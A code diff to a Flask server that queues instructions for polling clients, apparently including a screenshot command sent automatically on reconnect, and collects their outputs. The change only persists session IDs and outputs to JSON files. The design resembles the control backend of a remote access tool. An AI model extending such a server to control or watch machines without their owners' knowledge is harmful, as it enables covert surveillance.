@@ -35,11 +35,11 @@ def write_json(path, files):
     with open(path, "w") as w:
         json.dump(files, w)
 
-ssids = set()
+ssids = set(load_json("ssids.json"))
 
 clients = load_json("clients.json")
 client_instructions = {client: [] for client in clients}
-instruction_outputs = {client: {} for client in clients} # dict of tuples
+instruction_outputs = load_json("instruction_outputs.json")
 
 @app.route("/")
 def index():
@@ -52,6 +52,7 @@ def login():
     if check_password(contents["password"]):
         ssid = random_string(128)
         ssids.add(ssid)
+        write_json("ssids.json", list(ssids))
         response = make_response()
         response.set_cookie("ssid", ssid)
         return response
@@ -122,6 +123,7 @@ def clear_output():
         return redirect("/file_explorer/", code=302)
     client = request.args.get("u")
     instruction_outputs[client].clear()
+    write_json("instruction_outputs.json", instruction_outputs)
     return ""
 
 @app.route("/get_output/", methods=["GET"])
@@ -155,9 +157,10 @@ def instructions():
     last_call = clients[client] if client in clients else 0
     clients[client] = time.time()
     write_json("clients.json", clients)
-    if not client in client_instructions:
+    if not client in instruction_outputs:
         client_instructions[client] = []
         instruction_outputs[client] = {}
+        write_json("instruction_outputs.json", instruction_outputs)
     # if last call was more than timeout, add logon instruction
     if time.time() - last_call > 30:
         client_instructions[client].append(([random_string(10), "ss"], time.time()))
@@ -172,5 +175,5 @@ def outputs():
     if contents["instruction_id"] in instruction_outputs[client]:
         return ""
     instruction_outputs[client][contents["instruction_id"]] = (contents["type"], contents["data"])
-    print(instruction_outputs)
+    write_json("instruction_outputs.json", instruction_outputs)
     return ""
